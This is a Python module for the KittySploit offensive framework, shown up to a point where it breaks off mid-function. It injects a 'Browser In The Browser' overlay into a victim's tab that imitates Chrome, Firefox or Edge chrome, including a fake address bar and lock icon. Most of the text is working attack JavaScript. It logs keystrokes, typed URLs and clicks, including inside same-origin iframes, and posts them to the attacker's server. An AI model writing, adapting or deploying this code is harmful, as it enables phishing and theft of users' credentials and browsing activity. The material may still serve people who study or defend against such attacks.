from kittysploit import *
import uuid
import time
import json


class Module(BrowserAuxiliary):

    __info__ = {
        "name": "Browser In The Browser",
        "description": (
            "BITB: fake OS window and browser chrome inside the victim tab; "
            "capture omnibox URLs, chrome keystrokes, and same-origin iframe activity"
        ),
        "author": "KittySploit Team",
        "browser": Browser.ALL,
        "platform": Platform.ALL,
        "session_type": SessionType.BROWSER,
    }

    browser_type = OptString("auto", "chrome | firefox | edge | auto (from user agent)", False)
    target_url = OptString("", "Initial URL (empty = current page href)", False)
    layout = OptString("window", "window (centered BITB) | fullscreen", False)
    os_chrome = OptString("auto", "auto | macos | windows", False)
    theme = OptString("auto", "auto | light | dark", False)
    capture_keystrokes = OptBool(True, "Capture keystrokes (omnibox + same-origin iframe)", False)
    capture_urls = OptBool(True, "Capture URLs submitted in the omnibox", False)
    capture_clicks = OptBool(True, "Capture toolbar clicks and same-origin iframe clicks", False)
    timeout = OptInteger(120, "Monitor captures in seconds (0 = inject only, no console monitor)", False)

    def check(self):
        self._ensure_browser_server()
        if not self.browser_server:
            print_error("Browser server not available. Start it with 'browser_server start'")
            return False
        if not self.session_id:
            print_error("session_id is not set")
            return False
        layout = str(self.layout or "window").strip().lower()
        if layout not in ("window", "fullscreen"):
            print_error("layout must be 'window' or 'fullscreen'")
            return False
        return True

    def run(self):
        if not self.check():
            return False

        bitb_id = str(uuid.uuid4())
        opts = {
            "bitb_id": bitb_id,
            "browser_type": str(self.browser_type or "auto").strip().lower(),
            "target_url": str(self.target_url or "").strip(),
            "layout": str(self.layout or "window").strip().lower(),
            "os_chrome": str(self.os_chrome or "auto").strip().lower(),
            "theme": str(self.theme or "auto").strip().lower(),
            "capture_keystrokes": self._to_bool(self.capture_keystrokes),
            "capture_urls": self._to_bool(self.capture_urls),
            "capture_clicks": self._to_bool(self.capture_clicks),
        }

        code_js = self._build_js(opts)
        result = self.send_js_and_wait_for_response(code_js, timeout=20.0)
        if not result:
            print_error("Failed to inject Browser In The Browser (timeout or no response)")
            return False

        payload = self._parse_injection_result(result)
        if payload.get("error") or not payload.get("ok"):
            print_error(payload.get("error") or f"Unexpected injection response: {result}")
            return False

        print_success("Browser In The Browser injected successfully")
        print_info(f"Skin: {payload.get('browser', opts['browser_type'])} | OS chrome: {payload.get('os', opts['os_chrome'])}")
        print_info(f"Layout: {payload.get('layout', opts['layout'])} | theme: {payload.get('theme', opts['theme'])}")
        print_info(f"Initial URL: {payload.get('initial_url', '(current page)')}")
        print_info("Teardown in target tab: window.__ksBitb && window.__ksBitb.stop()")

        try:
            timeout_value = int(self.timeout) if self.timeout is not None else 120
        except (ValueError, TypeError):
            timeout_value = 120

        if timeout_value > 0:
            print_info("Press Ctrl+C to stop monitoring...")
            print_empty()
            try:
                self._monitor_captures(bitb_id, timeout_value)
            except KeyboardInterrupt:
                print_status("Monitoring interrupted by user")
            except Exception as e:
                print_warning(f"Monitoring error (BITB overlay remains active): {e}")
        else:
            print_info("Monitoring disabled (timeout=0).")

        return True

    @staticmethod
    def _parse_injection_result(result):
        if isinstance(result, dict):
            return result
        if not isinstance(result, str):
            return {"ok": False, "error": "Invalid response type"}
        text = result.strip()
        if text.startswith("{"):
            try:
                return json.loads(text)
            except json.JSONDecodeError:
                pass
        if "success" in text.lower() or "initialized" in text.lower():
            return {"ok": True, "message": text}
        return {"ok": False, "error": text or "Empty response"}

    def _build_js(self, opts: dict) -> str:
        cfg = json.dumps(opts)
        return f"""
        (function() {{
            const CFG = {cfg};
            const BITB_ID = CFG.bitb_id;

            function detectBrowser() {{
                if (CFG.browser_type && CFG.browser_type !== 'auto') return CFG.browser_type;
                const ua = navigator.userAgent || '';
                if (/Edg\\//.test(ua)) return 'edge';
                if (/Firefox\\//.test(ua)) return 'firefox';
                return 'chrome';
            }}

            function detectOS() {{
                if (CFG.os_chrome && CFG.os_chrome !== 'auto') return CFG.os_chrome;
                const p = navigator.platform || '';
                const ua = navigator.userAgent || '';
                if (/Mac|iPhone|iPad|iPod/.test(p) || /Mac OS/.test(ua)) return 'macos';
                return 'windows';
            }}

            function resolveTheme() {{
                if (CFG.theme === 'light' || CFG.theme === 'dark') return CFG.theme;
                if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) return 'dark';
                return 'light';
            }}

            if (window.__ksBitb && typeof window.__ksBitb.stop === 'function') {{
                try {{ window.__ksBitb.stop(); }} catch (e) {{}}
            }}

            const BROWSER = detectBrowser();
            const OS = detectOS();
            const DARK = resolveTheme() === 'dark';
            const LAYOUT = (CFG.layout === 'fullscreen') ? 'fullscreen' : 'window';
            const INITIAL = CFG.target_url || location.href;

            let SERVER_HOST = '127.0.0.1';
            let SERVER_PORT = '8080';
            if (window.kittysploit) {{
                if (typeof window.kittysploit.getServerHost === 'function') {{
                    SERVER_HOST = window.kittysploit.getServerHost();
                }}
                if (typeof window.kittysploit.getServerPort === 'function') {{
                    SERVER_PORT = window.kittysploit.getServerPort();
                }}
            }}

            function sendCapturedData(data) {{
                let currentSessionId = null;
                if (window.kittysploit && typeof window.kittysploit.sessionId === 'function') {{
                    currentSessionId = window.kittysploit.sessionId();
                }}
                fetch('http://' + SERVER_HOST + ':' + SERVER_PORT + '/api/command', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        session_id: currentSessionId,
                        command_id: BITB_ID,
                        result: JSON.stringify({{
                            type: 'browser_in_browser',
                            data: data,
                            timestamp: new Date().toISOString()
                        }}),
                        timestamp: new Date().toISOString()
                    }})
                }}).catch(function() {{}});
            }}

            const SKINS = {{
                chrome: {{
                    light: {{
                        bar: '#f1f3f4', border: '#dadce0', tabActive: '#ffffff', tabIdle: '#e8eaed',
                        text: '#202124', muted: '#5f6368', accent: '#1a73e8', input: '#ffffff',
                        title: '#ececec', page: '#e8eaed'
                    }},
                    dark: {{
                        bar: '#202124', border: '#3c4043', tabActive: '#35363a', tabIdle: '#292a2d',
                        text: '#e8eaed', muted: '#9aa0a6', accent: '#8ab4f8', input: '#303134',
                        title: '#3a3a3c', page: 'rgba(0,0,0,.55)'
                    }}
                }},
                firefox: {{
                    light: {{
                        bar: '#f9f9fa', border: '#d7d7db', tabActive: '#ffffff', tabIdle: '#f0f0f4',
                        text: '#0c0c0d', muted: '#737373', accent: '#0060df', input: '#ffffff',
                        title: '#ebebeb', page: '#e8eaed'
                    }},
                    dark: {{
                        bar: '#2b2a33', border: '#52525e', tabActive: '#42414d', tabIdle: '#32313c',
                        text: '#fbfbfe', muted: '#b1b1b3', accent: '#7cb3ff', input: '#1c1b22',
                        title: '#2b2a33', page: 'rgba(0,0,0,.55)'
                    }}
                }},
                edge: {{
                    light: {{
                        bar: '#f3f3f3', border: '#d1d1d1', tabActive: '#ffffff', tabIdle: '#f3f3f3',
                        text: '#1a1a1a', muted: '#666666', accent: '#0078d4', input: '#ffffff',
                        title: '#f0f0f0', page: '#e8eaed'
                    }},
                    dark: {{
                        bar: '#2d2d2d', border: '#454545', tabActive: '#3b3b3b', tabIdle: '#2d2d2d',
                        text: '#f3f3f3', muted: '#a0a0a0', accent: '#4cc2ff', input: '#1f1f1f',
                        title: '#2d2d2d', page: 'rgba(0,0,0,.55)'
                    }}
                }}
            }};

            const browserSkin = SKINS[BROWSER] || SKINS.chrome;
            const skin = browserSkin[DARK ? 'dark' : 'light'];

            const root = document.createElement('div');
            root.id = 'ks-bitb-root';
            if (LAYOUT === 'fullscreen') {{
                root.style.cssText = 'position:fixed;inset:0;z-index:2147483646;background:' + skin.page +
                    ';display:flex;flex-direction:column;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;';
            }} else {{
                root.style.cssText = 'position:fixed;inset:0;z-index:2147483646;background:' + skin.page +
                    ';display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;';
            }}

            const shell = document.createElement('div');
            shell.id = 'ks-bitb-container';
            if (LAYOUT === 'fullscreen') {{
                shell.style.cssText = 'flex:1;display:flex;flex-direction:column;min-height:0;background:' + skin.bar + ';';
            }} else {{
                shell.style.cssText = 'width:min(1140px,96vw);height:min(740px,90vh);display:flex;flex-direction:column;' +
                    'border-radius:12px;overflow:hidden;box-shadow:0 28px 80px rgba(0,0,0,.45);background:' + skin.bar + ';border:1px solid ' + skin.border + ';';
            }}

            const progress = document.createElement('div');
            progress.style.cssText = 'height:2px;width:0;background:' + skin.accent + ';flex-shrink:0;transition:width .35s ease;';

            const toolbar = document.createElement('div');
            toolbar.style.cssText = 'display:flex;align-items:center;gap:6px;padding:6px 10px;background:' + skin.bar +
                ';flex-shrink:0;';

            function makeBtn(svg, title) {{
                const btn = document.createElement('button');
                btn.type = 'button';
                btn.title = title;
                btn.innerHTML = svg;
                btn.style.cssText = 'width:34px;height:34px;border:none;background:transparent;border-radius:6px;color:' +
                    skin.muted + ';cursor:pointer;display:flex;align-items:center;justify-content:center;padding:0;';
                btn.onmouseenter = function() {{ btn.style.background = DARK ? '#3c4043' : '#e8eaed'; btn.style.color = skin.text; }};
                btn.onmouseleave = function() {{ btn.style.background = 'transparent'; btn.style.color = skin.muted; }};
                return btn;
            }}

            const nav = document.createElement('div');
            nav.style.cssText = 'display:flex;gap:2px;';
            const backBtn = makeBtn('<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>', 'Back');
            const forwardBtn = makeBtn('<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>', 'Forward');
            const refreshBtn = makeBtn('<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8M21 8v5M21 8h-5"/><path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16M3 16v-5M3 16h5"/></svg>', 'Reload');
            const homeBtn = makeBtn('<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>', 'Home');
            nav.appendChild(backBtn);
            nav.appendChild(forwardBtn);
            nav.appendChild(refreshBtn);
            nav.appendChild(homeBtn);

            const addressBarContainer = document.createElement('div');
            addressBarContainer.style.cssText = 'flex:1;display:flex;align-items:center;gap:8px;background:' + skin.input +
                ';border:1px solid ' + skin.border + ';border-radius:22px;padding:0 12px;min-height:36px;transition:box-shadow .2s,border-color .2s;';

            const securityIcon = document.createElement('span');
            securityIcon.style.cssText = 'display:flex;align-items:center;color:' + skin.muted + ';flex-shrink:0;';
            securityIcon.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>';

            const addressBar = document.createElement('input');
            addressBar.type = 'text';
            addressBar.value = INITIAL;
            addressBar.placeholder = 'Search or type a URL';
            addressBar.style.cssText = 'flex:1;border:none;background:transparent;outline:none;font-size:14px;color:' + skin.text + ';padding:8px 0;';

            const starBtn = document.createElement('span');
            starBtn.title = 'Bookmark';
            starBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>';
            starBtn.style.cssText = 'color:' + skin.muted + ';display:flex;cursor:default;opacity:.7;';

            addressBarContainer.appendChild(securityIcon);
            addressBarContainer.appendChild(addressBar);
            addressBarContainer.appendChild(starBtn);

            addressBar.addEventListener('focus', function() {{
                addressBarContainer.style.borderColor = skin.accent;
                addressBarContainer.style.boxShadow = '0 0 0 2px ' + skin.accent + '44';
            }});
            addressBar.addEventListener('blur', function() {{
                addressBarContainer.style.borderColor = skin.border;
                addressBarContainer.style.boxShadow = 'none';
            }});

            const menuWrap = document.createElement('div');
            menuWrap.style.cssText = 'position:relative;display:flex;align-items:center;';

            const menuBtn = makeBtn('<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" y1="6" x2="20" y2="6"/><line x1="4" y1="12" x2="20" y2="12"/><line x1="4" y1="18" x2="20" y2="18"/></svg>', 'Menu');
            const menuPanel = document.createElement('div');
            menuPanel.style.cssText = 'display:none;position:absolute;top:40px;right:0;min-width:220px;background:' + skin.tabActive +
                ';border:1px solid ' + skin.border + ';border-radius:8px;box-shadow:0 8px 28px rgba(0,0,0,.18);padding:6px 0;z-index:50;';

            function menuItem(label, opts) {{
                const row = document.createElement('button');
                row.type = 'button';
                const disabled = opts && opts.disabled;
                row.textContent = label;
                row.style.cssText = 'display:block;width:100%;text-align:left;border:none;background:transparent;padding:10px 16px;font-size:13px;color:' +
                    (disabled ? skin.muted : skin.text) + ';cursor:' + (disabled ? 'default' : 'pointer') + ';opacity:' + (disabled ? '.55' : '1') + ';';
                if (!disabled) {{
                    row.onmouseenter = function() {{ row.style.background = DARK ? '#3c4043' : '#f1f3f4'; }};
                    row.onmouseleave = function() {{ row.style.background = 'transparent'; }};
                    if (opts && opts.action) row.onclick = function(e) {{
                        e.stopPropagation();
                        menuPanel.style.display = 'none';
                        opts.action();
                    }};
                }}
                return row;
            }}

            function menuDivider() {{
                const d = document.createElement('div');
                d.style.cssText = 'height:1px;background:' + skin.border + ';margin:6px 0;';
                return d;
            }}

            menuPanel.appendChild(menuItem('New tab', {{ action: function() {{ openTab({{ ntp: true }}); }} }}));
            menuPanel.appendChild(menuItem('New window', {{ disabled: true }}));
            menuPanel.appendChild(menuDivider());
            menuPanel.appendChild(menuItem('Reload', {{ action: function() {{ reloadActiveTab(); }} }}));
            menuPanel.appendChild(menuItem('Print…', {{ disabled: true }}));
            menuPanel.appendChild(menuDivider());
            menuPanel.appendChild(menuItem('History', {{ disabled: true }}));
            menuPanel.appendChild(menuItem('Downloads', {{ disabled: true }}));
            menuPanel.appendChild(menuItem('Bookmarks', {{ disabled: true }}));
            menuPanel.appendChild(menuDivider());
            menuPanel.appendChild(menuItem('Settings', {{ disabled: true }}));
            menuPanel.appendChild(menuItem('Help', {{ disabled: true }}));
            menuPanel.appendChild(menuDivider());
            menuPanel.appendChild(menuItem('Exit fullscreen', {{ action: function() {{ stop(); }} }}));

            menuBtn.onclick = function(e) {{
                e.stopPropagation();
                const open = menuPanel.style.display === 'block';
                menuPanel.style.display = open ? 'none' : 'block';
                if (CFG.capture_clicks) sendCapturedData({{ event: 'menu_toggled', open: !open }});
            }};
            menuPanel.onclick = function(e) {{ e.stopPropagation(); }};
            menuWrap.appendChild(menuBtn);
            menuWrap.appendChild(menuPanel);

            const profile = document.createElement('div');
            profile.title = 'Profile';
            profile.style.cssText = 'width:28px;height:28px;border-radius:50%;background:' + skin.accent +
                ';color:#fff;font-size:12px;font-weight:600;display:flex;align-items:center;justify-content:center;margin-left:4px;cursor:pointer;';
            profile.textContent = 'K';
            profile.onclick = function(e) {{
                e.stopPropagation();
                menuPanel.style.display = 'none';
                if (CFG.capture_clicks) sendCapturedData({{ event: 'profile_clicked' }});
            }};

            toolbar.appendChild(nav);
            toolbar.appendChild(addressBarContainer);
            toolbar.appendChild(menuWrap);
            toolbar.appendChild(profile);

            const tabsBar = document.createElement('div');
            tabsBar.style.cssText = 'display:flex;align-items:flex-end;gap:2px;padding:6px 8px 0;background:' + skin.bar +
                ';border-bottom:1px solid ' + skin.border + ';flex-shrink:0;overflow-x:auto;';

            const newTabBtn = document.createElement('button');
            newTabBtn.type = 'button';
            newTabBtn.textContent = '+';
            newTabBtn.title = 'New tab';
            newTabBtn.style.cssText = 'width:28px;height:28px;border:none;background:transparent;color:' + skin.muted +
                ';font-size:18px;cursor:pointer;border-radius:4px;margin-bottom:4px;flex-shrink:0;';
            newTabBtn.onmouseenter = function() {{ newTabBtn.style.background = DARK ? '#3c4043' : '#e8eaed'; }};
            newTabBtn.onmouseleave = function() {{ newTabBtn.style.background = 'transparent'; }};

            const contentArea = document.createElement('div');
            contentArea.style.cssText = 'flex:1;min-height:0;position:relative;background:#fff;';

            const tabState = {{ tabs: [], activeId: null, seq: 0 }};

            function getActiveTab() {{
                return tabState.tabs.find(function(t) {{ return t.id === tabState.activeId; }}) || null;
            }}

            function styleTabEl(tabEl, active) {{
                tabEl.style.background = active ? skin.tabActive : skin.tabIdle;
                tabEl.style.fontWeight = active ? '500' : '400';
            }}

            function buildNewTabPage(ntpRoot, tabRec) {{
                const bg = DARK ? '#202124' : '#fff';
                const fg = DARK ? '#e8eaed' : '#202124';
                const muted = DARK ? '#9aa0a6' : '#5f6368';
                ntpRoot.style.cssText = 'position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;' +
                    'padding:48px 24px;background:' + bg + ';color:' + fg + ';box-sizing:border-box;overflow:auto;';
                const logo = document.createElement('div');
                logo.style.cssText = 'font-size:54px;font-weight:700;margin:24px 0 32px;letter-spacing:-1px;background:linear-gradient(90deg,' + skin.accent + ',#ea4335,#fbbc04);' +
                    '-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;';
                logo.textContent = BROWSER === 'firefox' ? 'Firefox' : (BROWSER === 'edge' ? 'Microsoft Edge' : 'Google');
                const searchWrap = document.createElement('div');
                searchWrap.style.cssText = 'width:min(560px,92%);display:flex;align-items:center;gap:10px;border:1px solid ' + skin.border +
                    ';border-radius:24px;padding:0 16px;min-height:46px;background:' + (DARK ? '#303134' : '#f1f3f4') + ';box-shadow:0 1px 6px rgba(0,0,0,.08);';
                const searchInput = document.createElement('input');
                searchInput.type = 'text';
                searchInput.placeholder = 'Search Google or type a URL';
                searchInput.style.cssText = 'flex:1;border:none;background:transparent;outline:none;font-size:16px;color:' + fg + ';padding:12px 0;';
                searchWrap.appendChild(searchInput);
                searchInput.addEventListener('keydown', function(e) {{
                    recordKey(e, 'ntp');
                    if (e.key === 'Enter') {{
                        loadUrlInTab(tabRec, searchInput.value);
                    }}
                }});
                const shortcuts = document.createElement('div');
                shortcuts.style.cssText = 'display:flex;flex-wrap:wrap;gap:12px;margin-top:36px;justify-content:center;max-width:560px;';
                [
                    {{ label: 'KittySploit', url: 'https://kittysploit.com' }},
                    {{ label: 'Gmail', url: 'https://mail.google.com' }},
                    {{ label: 'GitHub', url: 'https://github.com' }},
                    {{ label: 'YouTube', url: 'https://www.youtube.com' }}
                ].forEach(function(s) {{
                    const tile = document.createElement('button');
                    tile.type = 'button';
                    tile.style.cssText = 'width:112px;padding:14px 8px;border:none;border-radius:12px;background:' + (DARK ? '#292a2d' : '#f8f9fa') +
                        ';color:' + fg + ';font-size:12px;cursor:pointer;box-shadow:0 1px 2px rgba(0,0,0,.06);';
                    tile.innerHTML = '<img src="' + faviconFor(s.url) + '" width="32" height="32" style="border-radius:8px;margin-bottom:8px"/><div>' + s.label + '</div>';
                    tile.onclick = function() {{
                        if (CFG.capture_clicks) sendCapturedData({{ event: 'ntp_shortcut', label: s.label }});
                        loadUrlInTab(tabRec, s.url);
                    }};
                    shortcuts.appendChild(tile);
                }});
                const hint = document.createElement('p');
                hint.style.cssText = 'margin-top:28px;font-size:12px;color:' + muted + ';';
                hint.textContent = 'Tip: Ctrl+T opens a new tab';
                ntpRoot.appendChild(logo);
                ntpRoot.appendChild(searchWrap);
                ntpRoot.appendChild(shortcuts);
                ntpRoot.appendChild(hint);
            }}

            function createTabPane() {{
                const pane = document.createElement('div');
                pane.style.cssText = 'position:absolute;inset:0;display:none;';
                const ntp = document.createElement('div');
                ntp.className = 'ks-bitb-ntp';
                const iframe = document.createElement('iframe');
                iframe.className = 'ks-bitb-iframe';
                iframe.style.cssText = 'width:100%;height:100%;border:none;display:block;background:#fff;';
                iframe.referrerPolicy = 'no-referrer';
                const frameError = document.createElement('div');
                frameError.style.cssText = 'display:none;position:absolute;inset:0;flex-direction:column;align-items:center;justify-content:center;' +
                    'background:#fff;color:#5f6368;font-size:14px;text-align:center;padding:32px;box-sizing:border-box;';
                frameError.innerHTML = '<div style="font-size:42px;margin-bottom:12px">&#128683;</div>' +
                    '<div style="font-weight:600;color:#202124;margin-bottom:8px">This page cannot be displayed in the fake window</div>' +
                    '<p style="margin:0;font-size:13px;max-width:420px;line-height:1.5">The target may block embedding (X-Frame-Options, CSP frame-ancestors) or refused the connection.</p>';
                pane.appendChild(ntp);
                pane.appendChild(iframe);
                pane.appendChild(frameError);
                contentArea.appendChild(pane);
                return {{ pane: pane, ntp: ntp, iframe: iframe, frameError: frameError }};
            }}

            function wireIframeListeners(tabRec) {{
                if (tabRec._wired) return;
                tabRec._wired = true;
                const iframe = tabRec.iframe;
                iframe.addEventListener('load', function() {{
                    if (tabRec.id !== tabState.activeId) return;
                    setLoading(false);
                    tabRec.url = iframe.src || tabRec.url;
                    tabRec.isNtp = false;
                    showTabView(tabRec, 'frame');
                    syncChromeFromTab(tabRec);
                    if (CFG.capture_keystrokes) {{
                        try {{
                            const doc = iframe.contentDocument || iframe.contentWindow.document;
                            doc.addEventListener('keydown', function(e) {{ recordKey(e, 'iframe'); }});
                        }} catch (e) {{}}
                    }}
                    if (CFG.capture_clicks) {{
                        try {{
                            const doc = iframe.contentDocument || iframe.contentWindow.document;
                            doc.addEventListener('click', function(e) {{
                                sendCapturedData({{
                                    event: 'iframe_click',
                                    click: {{
                                        x: e.clientX,
                                        y: e.clientY,
                                        target: e.target && e.target.tagName,
                                        text: e.target && e.target.textContent ? String(e.target.textContent).substring(0, 50) : '',
                                        url: iframe.src,
                                        tab_id: tabRec.id,
                                        timestamp: new Date().toISOString()
                                    }}
                                }});
                            }});
                        }} catch (e) {{}}
                    }}
                }});
            }}

            function createTabEl(tabRec) {{
                const tab = document.createElement('div');
                tab.setAttribute('data-bitb-tab', String(tabRec.id));
                tab.style.cssText = 'display:flex;align-items:center;gap:8px;padding:8px 12px;max-width:240px;min-width:120px;' +
                    'border:1px solid ' + skin.border + ';border-bottom:none;border-radius:8px 8px 0 0;font-size:13px;color:' + skin.text + ';cursor:pointer;';
                const fav = document.createElement('img');
                fav.width = 16;
                fav.height = 16;
                fav.style.borderRadius = '2px';
                fav.alt = '';
                const label = document.createElement('span');
                label.textContent = tabRec.title || 'New Tab';
                label.style.cssText = 'overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1;';
                const close = document.createElement('span');
                close.innerHTML = '&#215;';
                close.style.cssText = 'opacity:0;width:18px;text-align:center;border-radius:4px;color:' + skin.muted + ';line-height:18px;';
                tab.onmouseenter = function() {{ close.style.opacity = '1'; }};
                tab.onmouseleave = function() {{ close.style.opacity = '0'; }};
                close.onmouseenter = function() {{ close.style.background = '#e81123'; close.style.color = '#fff'; }};
                close.onmouseleave = function() {{ close.style.background = 'transparent'; close.style.color = skin.muted; }};
                close.onclick = function(e) {{
                    e.stopPropagation();
                    closeTab(tabRec.id);
                }};
                tab.onclick = function() {{
                    activateTab(tabRec.id);
                    if (CFG.capture_clicks) sendCapturedData({{ event: 'tab_clicked', tab: label.textContent, tab_id: tabRec.id }});
                }};
                tab.appendChild(fav);
                tab.appendChild(label);
                tab.appendChild(close);
                tabRec.el = tab;
                tabRec.faviconEl = fav;
                tabRec.labelEl = label;
                return tab;
            }}

            function showTabView(tabRec, mode) {{
                tabRec.ntpEl.style.display = mode === 'ntp' ? 'flex' : 'none';
                tabRec.iframe.style.display = mode === 'frame' ? 'block' : 'none';
                tabRec.frameError.style.display = mode === 'error' ? 'flex' : 'none';
            }}

            function syncChromeFromTab(tabRec) {{
                if (!tabRec || tabRec.id !== tabState.activeId) return;
                if (tabRec.isNtp) {{
                    addressBar.value = '';
                    addressBar.placeholder = 'Search Google or type a URL';
                    updateSecurityIcon('about:blank');
                    if (tabRec.faviconEl) tabRec.faviconEl.removeAttribute('src');
                    if (tabRec.labelEl) tabRec.labelEl.textContent = 'New Tab';
                    return;
                }}
                const url = tabRec.url || tabRec.iframe.src || '';
                addressBar.value = url;
                updateSecurityIcon(url);
                if (url) {{
                    const fav = faviconFor(url);
                    if (fav && tabRec.faviconEl) tabRec.faviconEl.src = fav;
                    try {{
                        const host = new URL(url).hostname;
                        if (tabRec.labelEl) tabRec.labelEl.textContent = host;
                    }} catch (e) {{
                        if (tabRec.labelEl) tabRec.labelEl.textContent = url.substring(0, 48);
                    }}
                }}
            }}

            function activateTab(id) {{
                tabState.activeId = id;
                tabState.tabs.forEach(function(t) {{
                    const on = t.id === id;
                    t.pane.style.display = on ? 'block' : 'none';
                    if (t.el) styleTabEl(t.el, on);
                }});
                const active = getActiveTab();
                if (active) syncChromeFromTab(active);
            }}

            function openTab(opts) {{
                opts = opts || {{}};
                const id = ++tabState.seq;
                const parts = createTabPane();
                const tabRec = {{
                    id: id,
                    title: 'New Tab',
                    url: '',
                    isNtp: !opts.url,
                    pane: parts.pane,
                    ntpEl: parts.ntp,
                    iframe: parts.iframe,
                    frameError: parts.frameError
                }};
                buildNewTabPage(parts.ntp, tabRec);
                wireIframeListeners(tabRec);
                const el = createTabEl(tabRec);
                tabsBar.insertBefore(el, newTabBtn);
                tabState.tabs.push(tabRec);
                activateTab(id);
                if (opts.url) {{
                    loadUrlInTab(tabRec, opts.url);
                }} else {{
                    showTabView(tabRec, 'ntp');
                    tabRec.isNtp = true;
                }}
                if (CFG.capture_clicks) sendCapturedData({{ event: 'tab_opened', tab_id: id, ntp: !!opts.ntp }});
                return tabRec;
            }}

            function closeTab(id) {{
                const idx = tabState.tabs.findIndex(function(t) {{ return t.id === id; }});
                if (idx === -1) return;
                const wasActive = tabState.activeId === id;
                const tabRec = tabState.tabs[idx];
                if (tabRec.el) tabRec.el.remove();
                if (tabRec.pane) tabRec.pane.remove();
                tabState.tabs.splice(idx, 1);
                if (tabState.tabs.length === 0) {{
                    openTab({{ ntp: true }});
                    return;
                }}
                if (wasActive) {{
                    const next = tabState.tabs[Math.min(idx, tabState.tabs.length - 1)];
                    activateTab(next.id);
                }}
                if (CFG.capture_clicks) sendCapturedData({{ event: 'tab_closed', tab_id: id }});
            }}

            tabsBar.appendChild(newTabBtn);

            shell.appendChild(tabsBar);
            shell.appendChild(progress);
            shell.appendChild(toolbar);
            shell.appendChild(contentArea);
            root.appendChild(shell);
            document.body.appendChild(root);

            let pendingKeys = [];
            const keyFlush = setInterval(function() {{
                if (!CFG.capture_keystrokes || pendingKeys.length === 0) return;
                sendCapturedData({{ event: 'keystrokes', keystrokes: pendingKeys.slice() }});
                pendingKeys = [];
            }}, 3000);

            function faviconFor(url) {{
                try {{
                    const host = new URL(url).hostname;
                    return 'https://www.google.com/s2/favicons?domain=' + encodeURIComponent(host) + '&sz=32';
                }} catch (e) {{
                    return '';
                }}
            }}

            function updateSecurityIcon(url) {{
                const secure = /^https:\\/\\//i.test(url);
                securityIcon.style.color = secure ? skin.accent : skin.muted;
                securityIcon.innerHTML = secure
                    ? '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>'
                    : '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>';
            }}

            function setLoading(on) {{
                progress.style.width = on ? '65%' : '100%';
                if (!on) {{
                    setTimeout(function() {{ progress.style.width = '0'; }}, 350);
                }}
            }}

            function normalizeUrl(raw) {{
                let url = (raw || '').trim();
                if (!url) return '';
                if (!/^https?:\\/\\//i.test(url)) {{
                    if (url.indexOf('.') !== -1 && url.indexOf(' ') === -1) {{
                        url = 'https://' + url;
                    }} else {{
                        url = 'https://www.google.com/search?q=' + encodeURIComponent(url);
                    }}
                }}
                return url;
            }}

            function loadUrlInTab(tabRec, raw) {{
                const url = normalizeUrl(raw);
                if (!url || !tabRec) return;
                tabRec.isNtp = false;
                tabRec.url = url;
                setLoading(true);
                showTabView(tabRec, 'frame');
                try {{
                    tabRec.iframe.src = url;
                }} catch (e) {{
                    showTabView(tabRec, 'error');
                    setLoading(false);
                    return;
                }}
                if (tabRec.id === tabState.activeId) {{
                    addressBar.value = url;
                    updateSecurityIcon(url);
                    syncChromeFromTab(tabRec);
                }}
                if (tabRec.faviconEl) {{
                    const fav = faviconFor(url);
                    if (fav) tabRec.faviconEl.src = fav;
                }}
                if (tabRec.labelEl) {{
                    try {{ tabRec.labelEl.textContent = new URL(url).hostname; }} catch (e) {{ tabRec.labelEl.textContent = url.slice(0, 40); }}
                }}
                if (CFG.capture_urls) {{
                    sendCapturedData({{ event: 'url_entered', url: url, tab_id: tabRec.id }});
                }}
            }}

            function loadUrl(raw) {{
                const tab = getActiveTab();
                if (!tab) return;
                loadUrlInTab(tab, raw);
            }}

            function reloadActiveTab() {{
                const tab = getActiveTab();
                if (!tab) return;
                if (tab.isNtp) return;
                wireNavClick('refresh_clicked');
                setLoading(true);
                tab.iframe.src = tab.iframe.src;
            }}

            function recordKey(e, where) {{
                if (!CFG.capture_keystrokes) return;
                const entry = {{
                    key: e.key,
                    code: e.code,
                    where: where,
                    shiftKey: e.shiftKey,
                    ctrlKey: e.ctrlKey,
                    altKey: e.altKey,
                    metaKey: e.metaKey,
                    timestamp: new Date().toISOString()
                }};
                pendingKeys.push(entry);
